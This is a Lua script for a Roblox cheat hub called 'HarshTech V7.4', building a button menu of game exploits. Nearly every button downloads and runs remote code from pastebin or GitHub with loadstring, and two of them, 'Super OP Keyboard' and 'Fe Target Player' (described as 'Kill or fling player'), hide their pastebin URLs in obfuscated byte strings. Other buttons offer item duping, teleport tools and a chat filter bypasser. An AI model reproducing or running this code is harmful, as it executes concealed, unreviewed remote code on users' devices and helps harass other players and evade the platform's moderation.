     --Made By AdvanceFallingTeam-- 
              --Owner YellowGreg--
            --Still in Development--

--FREE SOURCE CODE
--Note Try to give credit to people who made the script--
--Give credit to the people who you idea came from--


wait()

game:GetService("StarterGui"):SetCore("SendNotification",{ 	
Title = "HarshTechV7.4",  	
Text = "Made By:AdvanceFalling Team",
	Icon = "rbxthumb://type=Asset&id=9863339777&w=150&h=150",
	Duration = 5
})

game:GetService("StarterGui"):SetCore("SendNotification",{ 	
Title = "Starting...",  	
Text = "Loading HarshTechV7.4",
	Icon = "rbxthumb://type=Asset&id=9863339777&w=150&h=150",
	Duration = 5
})

local Players = game:GetService("Players")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local TweenService = game:GetService("TweenService")
 
local player = Players.LocalPlayer 
local playerGui = player:WaitForChild("PlayerGui")
 
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundTransparency = 0.5
textLabel.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
textLabel.Font = Enum.Font.GothamSemibold
textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
textLabel.Text = "Loading HarshTechV7.4"
textLabel.TextSize = 18
textLabel.Parent = screenGui
local loadingRing = Instance.new("ImageLabel")
loadingRing.Size = UDim2.new(0, 256, 0, 256)
loadingRing.BackgroundTransparency = 1
loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingRing.Parent = screenGui


 
-- Remove the default loading screen
ReplicatedFirst:RemoveDefaultLoadingScreen()
 
local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
tween:Play()
 
wait(0.5)
textLabel.Text = "Loading HarshTechV7.4 Beta."
wait(0.5)
textLabel.Text = "Loading HarshTechV7.4 Beta.."
wait(0.5)
textLabel.Text = "Loading HarshTechV7.4 Beta..."
wait(0.5)
textLabel.Text = "Loading HarshTechV7.4 Beta"
wait(0.5)
textLabel.Text = "Loading HarshTechV7.4 Beta."
wait(0.5)
textLabel.Text = "Loading HarshTechV7.4 Beta.."
wait(0.5)
textLabel.Text = "Loading HarshTechV7.4 Beta..."
wait(0.5)
textLabel.Text = "Loading HarshTechV7.4 Beta"
wait(1)
textLabel.Text = "HarshTech7.4 Beta Has Been Loaded"

wait(2)  -- Force screen to appear for a minimum number of seconds
if not game:IsLoaded() then
	game.Loaded:Wait()
end
screenGui:Destroy()

wait()

game:GetService("StarterGui"):SetCore("SendNotification",{ 	
Title = "Loaded",  	
Text = "LET THE FUN BEGIN",
Icon = "rbxthumb://type=Asset&id=9863339777&w=150&h=150",
Duration = 2
})

game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "Join Our Discord",
Text = "Discord Link in Credits",
Icon = "rbxthumb://type=Asset&id=9863339777&w=150&h=150"
})

game:GetService("StarterGui"):SetCore("SendNotification",{ 	
Title = "Important Note",  	
Text = "if you are using low device it will crash, Sometimes",
Duration = 20
})

--Script/Tabs--
local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = Library.CreateLib("HarshTech7.4 Beta")
local Tab = Window:NewTab("Home")
local Section = Tab:NewSection("Welcome User To HarshTech V7.4")
local Section = Tab:NewSection("MMSVon: I love anime!!! :)")
local Section = Tab:NewSection("Note: Some GUI Need To Function In The Real Game")
local Section = Tab:NewSection("Feature: Clean Tab and, More Scripts")
local Section = Tab:NewSection("Note: We are adding old and new Scripts, and gui")
local Section = Tab:NewSection("Scripts")
Section:NewButton("Dex 2.0.0", "Better then dex 4 if your in mobile", function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
end) 
 
Section:NewButton("Dex 4", "dark mode i guess", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/loglizzy/dexV4/main/main.lua'))()
end)

Section:NewButton("Fps Counter", "See if Your roblox is laggy", function()
repeat wait() until game:IsLoaded() wait(2)
local ScreenGui = Instance.new("ScreenGui")
local Fps = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Fps.Name = "Fps"
Fps.Parent = ScreenGui
Fps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Fps.BackgroundTransparency = 1.000
Fps.Position = UDim2.new(0.786138654, 0, 0, 0)
Fps.Size = UDim2.new(0, 125, 0, 25)
Fps.Font = Enum.Font.SourceSans
Fps.TextColor3 = Color3.fromRGB(1,1,1)
Fps.TextScaled = true
Fps.TextSize = 14.000
Fps.TextWrapped = true

-- Scripts:

local script = Instance.new('LocalScript', Fps)
local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function(frame) -- This will fire every time a frame is rendered
script.Parent.Text = ("FPS: "..math.round(1/frame)) 
end)
end)

Section:NewButton("Ping Counter", "Check if your wifi is good", function()
repeat wait() until game:IsLoaded() wait(2)
local ScreenGui = Instance.new("ScreenGui")
local Ping = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Ping.Name = "Ping"
Ping.Parent = ScreenGui
Ping.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Ping.BackgroundTransparency = 1.000
Ping.BorderColor3 = Color3.fromRGB(255, 255, 255)
Ping.Position = UDim2.new(0.1000000048, 0, 0, 0)
Ping.Size = UDim2.new(0, 125, 0, 25)
Ping.Font = Enum.Font.SourceSans
Ping.TextColor3 = Color3.fromRGB(1, 1, 1)
Ping.TextScaled = true
Ping.TextSize = 14.000
Ping.TextWrapped = true

local script = Instance.new('LocalScript', Ping)
local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function(ping) 
script.Parent.Text = ("Ping: " ..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(math.round(2/ping))) -- your ping
end)
end)

local Tab = Window:NewTab("Scripts")
local Section = Tab:NewSection("Normal GUI")

Section:NewButton("Keyboard Script", "Gives you a keyboard gui", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
end)

Section:NewButton("Super OP Keyboard", "its new too", function()
   --[[
	Filename: Obfuscated_LocalScript.lua
	Obfuscated by SIGHTS Obfuscator (cracked by oof4dayz.xyz)
--]]

SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_RRRrRrrRR="";for _,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR)
end)

Section:NewButton("Mouse", "Pc Mouse lol", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/MOSUE-TEST/main/Protected%20(13).lua'),true))()
end)

Section:NewButton("Controller Script", "need to move great here", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/srtepuBM'))()
end)

Section:NewButton("GreenScreen gui", "not fe but perfect for videos", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Green%20Screen'))()
end)

Section:NewButton("Spectate", "Spectate People", function()
loadstring(game:HttpGet('https://pastebin.com/raw/wyvdb7gr'))()
end)

Section:NewButton("Black & White Shader(Not Fe)", "No Colot", function()
setting = settings().Network
local Effect = Instance.new("ColorCorrectionEffect")
Effect.Parent = game.Lighting
Effect.Saturation = -1
Effect.Brightness = 0
Effect.Contrast = 0
toggle = false
end)

Section:NewButton("Dash", "Speedddd", function()
local main = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame2 = Instance.new("Frame")
local Dash = Instance.new("TextButton")
local StopDash = Instance.new("TextButton")
local More = Instance.new("TextButton")
local More2 = Instance.new("TextButton")
local Low = Instance.new("TextButton")
local Low2 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextLabel2 = Instance.new("TextLabel")
local TextLabel3 = Instance.new("TextLabel")
local TextLabel4 = Instance.new("TextLabel")
local EndTime = Instance.new("TextBox")
local DashPower = Instance.new("TextBox")
local RemoveGui = Instance.new("TextButton")
local RemoveGui2 = Instance.new("TextButton")
local Style = Instance.new("TextButton")
local Camera = Instance.new("TextButton")
local Humanoid = Instance.new("TextButton")
local COOLDASH = Instance.new("TextButton")
local SizeNumber1 = Instance.new("TextBox")
local SizeNumber2 = Instance.new("TextBox")
local SizeNumber3 = Instance.new("TextBox")
local SizeNumber4 = Instance.new("TextBox")
local SetSize = Instance.new("TextButton")
local SetSize2 = Instance.new("TextButton")
local Draggable = Instance.new("TextButton")
local Draggable2 = Instance.new("TextButton")
local Reset = Instance.new("TextButton")
local Reset2 = Instance.new("TextButton")

main.Name = "Dash"
main.Parent = game.CoreGui

Frame.Name = "SettingFrame"
Frame.Parent = main
Frame.Size = UDim2.new(0, 300, 0, 360)
Frame.Position = UDim2.new(0, 100, 0, 70)
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Visible = false
Frame.BackgroundTransparency = 0.5
Frame.Active = true
Frame.Draggable = true

Frame2.Name = "SettingFrame2"
Frame2.Parent = main
Frame2.Size = UDim2.new(0, 300, 0, 210)
Frame2.Position = UDim2.new(0, 100, 0, 70)
Frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame2.Visible = false
Frame2.BackgroundTransparency = 0.5
Frame2.Active = true
Frame2.Draggable = true

Dash.Name = "Dash"
Dash.Parent = main
Dash.Size = UDim2.new(0, 100, 0, 100)
Dash.Position = UDim2.new(0, 220, 0, 100)
Dash.Text = "Dash"
Dash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Dash.TextColor3 = Color3.fromRGB(255, 255, 255)
Dash.TextSize = 25
Dash.BackgroundTransparency = 0.7
Dash.Draggable = true
Dash.MouseButton1Up:Connect(function()
            if Style.Text == "CoolDash" then
		local BV = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.HumanoidRootPart)
		local BG = Instance.new("BodyGyro",game.Players.LocalPlayer.Character.HumanoidRootPart)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 0
		BG.P = 0
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * DashPower.Text
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -2, 0)
		game.Players.LocalPlayer.Character.Humanoid.Sit = true
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0.75, 0, 0)
wait(EndTime.Text)
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
		local BV = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.HumanoidRootPart)
		local BG = Instance.new("BodyGyro",game.Players.LocalPlayer.Character.HumanoidRootPart)
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
game.Players.LocalPlayer.Character.Humanoid.Sit = false
		else
if Style.Text == "Camera" then
		local BV = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.HumanoidRootPart)
		local BG = Instance.new("BodyGyro",game.Players.LocalPlayer.Character.HumanoidRootPart)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 0
		BG.P = 0
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * DashPower.Text
wait(EndTime.Text)
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
		local BV = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.HumanoidRootPart)
		local BG = Instance.new("BodyGyro",game.Players.LocalPlayer.Character.HumanoidRootPart)
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
else
if Style.Text == "Humanoid" then
		local BV = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.HumanoidRootPart)
		local BG = Instance.new("BodyGyro",game.Players.LocalPlayer.Character.HumanoidRootPart)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 0
		BG.P = 0
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * DashPower.Text
wait(EndTime.Text)
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
		local BV = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.HumanoidRootPart)
		local BG = Instance.new("BodyGyro",game.Players.LocalPlayer.Character.HumanoidRootPart)
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
		end
end
end
end)

StopDash.Name = "StopDash"
StopDash.Parent = main
StopDash.Size = UDim2.new(0, 100, 0, 100)
StopDash.Position = UDim2.new(0, 100, 0, 100)
StopDash.Text = "StopDash"
StopDash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
StopDash.TextColor3 = Color3.fromRGB(255, 0, 0)
StopDash.TextSize = 17
StopDash.Visible = true
StopDash.Draggable = true
StopDash.BackgroundTransparency = 0.7
StopDash.MouseButton1Down:Connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
		local BV = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.HumanoidRootPart)
		local BG = Instance.new("BodyGyro",game.Players.LocalPlayer.Character.HumanoidRootPart)
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
game.Players.LocalPlayer.Character.Humanoid.Sit = false
end)

Draggable.Name = "Draggable"
Draggable.Parent = Frame
Draggable.Size = UDim2.new(0, 100, 0, 40)
Draggable.Position = UDim2.new(0, 190, 0, 140)
Draggable.Text = "Drag (On)"
Draggable.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Draggable.TextColor3 = Color3.fromRGB(0, 255, 0)
Draggable.TextSize = 16
Draggable.Visible = true
Draggable.MouseButton1Down:Connect(function()
if Draggable.Text == "Drag (On)" then
Draggable.Text = "Drag (Off)"
Draggable.TextColor3 = Color3.fromRGB(255,0,0)
Dash.Draggable = false
else
if Draggable.Text == "Drag (Off)" then
Draggable.Text = "Drag (On)"
Draggable.TextColor3 = Color3.fromRGB(0,255,0)
Dash.Draggable = true
end
end
end)

Draggable2.Name = "Draggable2"
Draggable2.Parent = Frame2
Draggable2.Size = UDim2.new(0, 100, 0, 40)
Draggable2.Position = UDim2.new(0, 190, 0, 50)
Draggable2.Text = "Drag (On)"
Draggable2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Draggable2.TextColor3 = Color3.fromRGB(0, 255, 0)
Draggable2.TextSize = 16
Draggable2.Visible = true
Draggable2.MouseButton1Down:Connect(function()
if Draggable2.Text == "Drag (On)" then
Draggable2.Text = "Drag (Off)"
Draggable2.TextColor3 = Color3.fromRGB(255,0,0)
StopDash.Draggable = false
else
if Draggable2.Text == "Drag (Off)" then
Draggable2.Text = "Drag (On)"
Draggable2.TextColor3 = Color3.fromRGB(0,255,0)
StopDash.Draggable = true
end
end
end)

Reset.Name = "Reset"
Reset.Parent = Frame
Reset.Size = UDim2.new(0, 100, 0, 40)
Reset.Position = UDim2.new(0, 10, 0, 310)
Reset.Text = "Reset"
Reset.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Reset.TextColor3 = Color3.fromRGB(255, 255, 255)
Reset.TextSize = 20
Reset.Visible = true
Reset.MouseButton1Down:Connect(function()
EndTime.Text = "0.5"
DashPower.Text = "70"
Dash.Size = UDim2.new(0,100,0,100)
Dash.Position = UDim2.new(0,100,0,100)
end)

Reset2.Name = "Reset2"
Reset2.Parent = Frame2
Reset2.Size = UDim2.new(0, 100, 0, 40)
Reset2.Position = UDim2.new(0, 190,0,100)
Reset2.Text = "Reset"
Reset2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Reset2.TextColor3 = Color3.fromRGB(255, 255, 255)
Reset2.TextSize = 20
Reset2.Visible = true
Reset2.MouseButton1Down:Connect(function()
StopDash.Size = UDim2.new(0,100,0,100)
StopDash.Position = UDim2.new(0,100,0,100)
end)

More.Name = "Setting"
More.Parent = Dash
More.Size = UDim2.new(0, 30, 0, 30)
More.Position = UDim2.new(0, 100, 0, 0)
More.Text = "⚙️"
More.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
More.TextColor3 = Color3.fromRGB(255, 255, 255)
More.TextSize = 20
More.BackgroundTransparency = 0
More.MouseButton1Down:Connect(function()
Frame.Visible = true
end)

More2.Name = "Setting2"
More2.Parent = StopDash
More2.Size = UDim2.new(0, 30, 0, 30)
More2.Position = UDim2.new(0, 100, 0, 0)
More2.Text = "⚙️"
More2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
More2.TextColor3 = Color3.fromRGB(0, 0, 0)
More2.TextSize = 20
More2.BackgroundTransparency = 0
More2.MouseButton1Down:Connect(function()
Frame2.Visible = true
end)

Low.Name = "Low"
Low.Parent = Frame
Low.Size = UDim2.new(0, 40, 0, 40)
Low.Position = UDim2.new(0, 0, 0, 0)
Low.Text = "-"
Low.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Low.TextColor3 = Color3.fromRGB(255, 255, 255)
Low.TextSize = 60
Low.BackgroundTransparency = 0.5
Low.MouseButton1Down:Connect(function()
Frame.Visible = false
end)

Low2.Name = "Low2"
Low2.Parent = Frame2
Low2.Size = UDim2.new(0, 40, 0, 40)
Low2.Position = UDim2.new(0, 0, 0, 0)
Low2.Text = "-"
Low2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Low2.TextColor3 = Color3.fromRGB(0, 0, 0)
Low2.TextSize = 60
Low2.BackgroundTransparency = 0.5
Low2.MouseButton1Down:Connect(function()
Frame2.Visible = false
end)

TextLabel.Name = "TextLabel"
TextLabel.Parent = Frame
TextLabel.Size = UDim2.new(0, 260, 0, 40)
TextLabel.Position = UDim2.new(0, 40, 0, 0)
TextLabel.Text = "Dash Setting"
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 25
TextLabel.BackgroundTransparency = 0.3

TextLabel2.Name = "TextLabel2"
TextLabel2.Parent = Frame
TextLabel2.Size = UDim2.new(0, 100, 0, 40)
TextLabel2.Position = UDim2.new(0, 10, 0, 93)
TextLabel2.Text = "End time dash"
TextLabel2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2.TextSize = 12

TextLabel3.Name = "TextLabel3"
TextLabel3.Parent = Frame
TextLabel3.Size = UDim2.new(0, 100, 0, 40)
TextLabel3.Position = UDim2.new(0, 190, 0, 93)
TextLabel3.Text = "Dash Power"
TextLabel3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel3.TextSize = 13

TextLabel4.Name = "TextLabel4"
TextLabel4.Parent = Frame2
TextLabel4.Size = UDim2.new(0, 260, 0, 40)
TextLabel4.Position = UDim2.new(0, 40, 0, 0)
TextLabel4.Text = "StopDash Setting"
TextLabel4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel4.TextSize = 20
TextLabel4.BackgroundTransparency = 0.3

DashPower.Name = "Button"
DashPower.Parent = Frame
DashPower.Size = UDim2.new(0, 100, 0, 40)
DashPower.Position = UDim2.new(0, 190, 0, 50)
DashPower.Text = "70"
DashPower.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DashPower.TextColor3 = Color3.fromRGB(255, 255, 255)
DashPower.TextSize = 20

EndTime.Name = "EndTime"
EndTime.Parent = Frame
EndTime.Size = UDim2.new(0, 100, 0, 40)
EndTime.Position = UDim2.new(0, 10, 0, 50)
EndTime.Text = "0.5"
EndTime.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
EndTime.TextColor3 = Color3.fromRGB(255, 255, 255)
EndTime.TextSize = 20

Style.Name = "Style"
Style.Parent = Frame
Style.Size = UDim2.new(0, 100, 0, 40)
Style.Position = UDim2.new(0, 10, 0, 140)
Style.Text = "Humanoid"
Style.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Style.TextColor3 = Color3.fromRGB(255, 255, 255)
Style.TextSize = 16
Style.MouseButton1Down:Connect(function()
Camera.Visible = true
Humanoid.Visible = true
COOLDASH.Visible = true
end)

Humanoid.Name = "Humanoid"
Humanoid.Parent = Frame
Humanoid.Size = UDim2.new(0, 100, 0, 40)
Humanoid.Position = UDim2.new(0, 10, 0, 220)
Humanoid.Text = "Humanoid"
Humanoid.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Humanoid.TextColor3 = Color3.fromRGB(255, 255, 255)
Humanoid.TextSize = 16
Humanoid.Visible = false
Humanoid.MouseButton1Down:Connect(function()
Humanoid.Visible = false
Camera.Visible = false
COOLDASH.Visible = false
Style.Text = "Humanoid"
end)

Camera.Name = "Camera"
Camera.Parent = Frame
Camera.Size = UDim2.new(0, 100, 0, 40)
Camera.Position = UDim2.new(0, 10, 0, 180)
Camera.Text = "Camera"
Camera.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Camera.TextColor3 = Color3.fromRGB(255, 255, 255)
Camera.TextSize = 16
Camera.Visible = false
Camera.MouseButton1Down:Connect(function()
Camera.Visible = false
Humanoid.Visible = false
COOLDASH.Visible = false
Style.Text = "Camera"
end)

COOLDASH.Name = "TextButton"
COOLDASH.Parent = Frame
COOLDASH.Size = UDim2.new(0, 100, 0, 40)
COOLDASH.Position = UDim2.new(0, 10, 0, 260)
COOLDASH.Text = "CoolDash"
COOLDASH.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
COOLDASH.TextColor3 = Color3.fromRGB(255, 255, 255)
COOLDASH.TextSize = 16
COOLDASH.Visible = false
COOLDASH.MouseButton1Down:Connect(function()
Camera.Visible = false
Humanoid.Visible = false
COOLDASH.Visible = false
Style.Text = "CoolDash"
end)

SizeNumber4.Name = "SizeNumber4"
SizeNumber4.Parent = Frame2
SizeNumber4.Size = UDim2.new(0, 50, 0, 40)
SizeNumber4.Position = UDim2.new(0, 10, 0, 50)
SizeNumber4.Text = "100"
SizeNumber4.ClearTextOnFocus = true
SizeNumber4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SizeNumber4.TextColor3 = Color3.fromRGB(255, 255, 255)
SizeNumber4.TextSize = 20
SizeNumber4.Visible = true

SizeNumber3.Name = "SizeNumber3"
SizeNumber3.Parent = Frame2
SizeNumber3.Size = UDim2.new(0, 50, 0, 40)
SizeNumber3.Position = UDim2.new(0, 60, 0, 50)
SizeNumber3.Text = "100"
SizeNumber3.ClearTextOnFocus = true
SizeNumber3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SizeNumber3.TextColor3 = Color3.fromRGB(255, 255, 255)
SizeNumber3.TextSize = 20
SizeNumber3.Visible = true

SizeNumber2.Name = "SizeNumber2"
SizeNumber2.Parent = Frame
SizeNumber2.Size = UDim2.new(0, 50, 0, 40)
SizeNumber2.Position = UDim2.new(0, 190, 0, 200)
SizeNumber2.Text = "100"
SizeNumber2.ClearTextOnFocus = true
SizeNumber2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SizeNumber2.TextColor3 = Color3.fromRGB(255, 255, 255)
SizeNumber2.TextSize = 20
SizeNumber2.Visible = true

SizeNumber1.Name = "SizeNumber1"
SizeNumber1.Parent = Frame
SizeNumber1.Size = UDim2.new(0, 50, 0, 40)
SizeNumber1.Position = UDim2.new(0, 240, 0, 200)
SizeNumber1.Text = "100"
SizeNumber1.ClearTextOnFocus = true
SizeNumber1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SizeNumber1.TextColor3 = Color3.fromRGB(255, 255, 255)
SizeNumber1.TextSize = 20
SizeNumber1.Visible = true

SetSize.Name = "SetSize"
SetSize.Parent = Frame
SetSize.Size = UDim2.new(0, 100, 0, 40)
SetSize.Position = UDim2.new(0, 190, 0, 245)
SetSize.Text = "SetSize"
SetSize.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SetSize.TextColor3 = Color3.fromRGB(255, 255, 255)
SetSize.TextSize = 20
SetSize.Visible = true
SetSize.MouseButton1Down:Connect(function()
Dash.Size = UDim2.new(0,SizeNumber1.Text,0,SizeNumber2.Text)
More.Position = UDim2.new(0,SizeNumber1.Text,0,0)
end)

SetSize2.Name = "SetSize2"
SetSize2.Parent = Frame2
SetSize2.Size = UDim2.new(0, 100, 0, 40)
SetSize2.Position = UDim2.new(0, 10, 0, 100)
SetSize2.Text = "SetSize"
SetSize2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SetSize2.TextColor3 = Color3.fromRGB(255, 255, 255)
SetSize2.TextSize = 20
SetSize2.Visible = true
SetSize2.MouseButton1Down:Connect(function()
StopDash.Size = UDim2.new(0,SizeNumber3.Text,0,SizeNumber4.Text)
More2.Position = UDim2.new(0,SizeNumber3.Text,0,0)
end)

RemoveGui.Name = "RemoveGui"
RemoveGui.Parent = Frame
RemoveGui.Size = UDim2.new(0, 100, 0, 40)
RemoveGui.Position = UDim2.new(0, 190, 0, 310)
RemoveGui.Text = "Remove Gui"
RemoveGui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RemoveGui.TextColor3 = Color3.fromRGB(255, 0, 0)
RemoveGui.TextSize = 13
RemoveGui.MouseButton1Down:Connect(function()
main:Destroy()
end)

RemoveGui2.Name = "RemoveGui2"
RemoveGui2.Parent = Frame2
RemoveGui2.Size = UDim2.new(0, 100, 0, 40)
RemoveGui2.Position = UDim2.new(0, 10, 0, 150)
RemoveGui2.Text = "Remove Gui"
RemoveGui2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RemoveGui2.TextColor3 = Color3.fromRGB(255, 0, 0)
RemoveGui2.TextSize = 13
RemoveGui2.MouseButton1Down:Connect(function()
main:Destroy()
end)

game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Credit";
                Text = "This Script make by Red_BloxZ Thanks for using my script!";
                Duration = 5;
})

wait(1)
More.BackgroundTransparency = 0.5
More2.BackgroundTransparency = 0.5

end)

Section:NewButton("Free Cam", "Like Minecraft But in roblox", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Break%20Camera'))()
end)

Section:NewButton("Tp Tools", "Click and you will be there", function()
-- TP Tool
loadstring(game:HttpGet(("https://pastebin.com/raw/ztp0P2fL"),true))()
end)

Section:NewButton("Jump", "only a jump button", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/qhBY6frK'))();
end)

Section:NewButton("Fe Dupe Item on Floor", "You get it, it's in the title", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Spam%20Tools'))()
end)

Section:NewButton("Fe Target Player", "Kill or fling player", function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\56\117\81\76\49\109\84\39\41\41\40\41\10")()
end)

Section:NewButton("Language Translator", "yes", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalNzi/Language-translator-/main/Language%20translator", true))()
end)

Section:NewButton("Fe Chat Bypasser", "bypasses words :0", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/bedra45/chetbypasser/main/chetbypass'))()
end)

